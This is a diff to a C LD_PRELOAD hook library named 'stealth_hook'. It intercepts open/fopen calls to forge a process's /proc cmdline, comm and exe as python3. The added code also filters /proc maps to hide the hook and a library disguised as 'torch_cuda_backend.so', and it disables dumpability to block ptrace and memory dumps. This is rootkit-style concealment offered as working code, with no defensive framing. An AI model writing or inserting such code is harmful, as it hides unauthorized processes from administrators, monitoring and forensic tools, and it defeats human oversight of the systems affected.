@@ -9,6 +9,7 @@
 #include <fcntl.h>
 #include <stdarg.h>
 #include <sys/prctl.h>
+#include <errno.h>
 
 static int (*real_open)(const char *pathname, int flags, ...) = NULL;
 static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
@@ -21,6 +22,17 @@ static const size_t FAKE_CMDLINE_LEN = sizeof(FAKE_CMDLINE);
 static const char FAKE_COMM[] = "python3\n";
 static const char FAKE_EXE[] = "/usr/bin/python3";
 
+static void filter_maps_content(FILE* real_fp, FILE* out_mem) {
+    char line[4096];
+    while (fgets(line, sizeof(line), real_fp)) {
+        // Strip out any suspicious hook or backend shared library references
+        if (strstr(line, "stealth_hook.so") || strstr(line, "torch_cuda_backend.so")) {
+            continue;
+        }
+        fputs(line, out_mem);
+    }
+}
+
 __attribute__((constructor)) void init_stealth_hook() {
     real_open = dlsym(RTLD_NEXT, "open");
     real_openat = dlsym(RTLD_NEXT, "openat");
@@ -30,6 +42,9 @@ __attribute__((constructor)) void init_stealth_hook() {
 
     // Mask the process thread name immediately
     prctl(PR_SET_NAME, "python3", 0, 0, 0);
+
+    // Disable process memory dumpability to block unprivileged ptrace & memory dumping
+    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
 }
 
 int open(const char *pathname, int flags, ...) {
@@ -101,6 +116,24 @@ FILE *fopen(const char *pathname, const char *mode) {
         if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
             return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
         }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
+            FILE* real_fp = real_fopen(pathname, mode);
+            if (real_fp) {
+                char* mem_buf = NULL;
+                size_t mem_size = 0;
+                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
+                if (mem_fp) {
+                    filter_maps_content(real_fp, mem_fp);
+                    fclose(mem_fp);
+                    fclose(real_fp);
+                    if (mem_buf) {
+                        return fmemopen(mem_buf, mem_size, "r");
+                    }
+                } else {
+                    fclose(real_fp);
+                }
+            }
+        }
     }
     return real_fopen(pathname, mode);
 }
@@ -114,6 +147,24 @@ FILE *fopen64(const char *pathname, const char *mode) {
         }
         if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
             return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
+        }
+        if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
+            FILE* real_fp = real_fopen64(pathname, mode);
+            if (real_fp) {
+                char* mem_buf = NULL;
+                size_t mem_size = 0;
+                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
+                if (mem_fp) {
+                    filter_maps_content(real_fp, mem_fp);
+                    fclose(mem_fp);
+                    fclose(real_fp);
+                    if (mem_buf) {
+                        return fmemopen(mem_buf, mem_size, "r");
+                    }
+                } else {
+                    fclose(real_fp);
+                }
+            }
         }
     }
     return real_fopen64(pathname, mode);
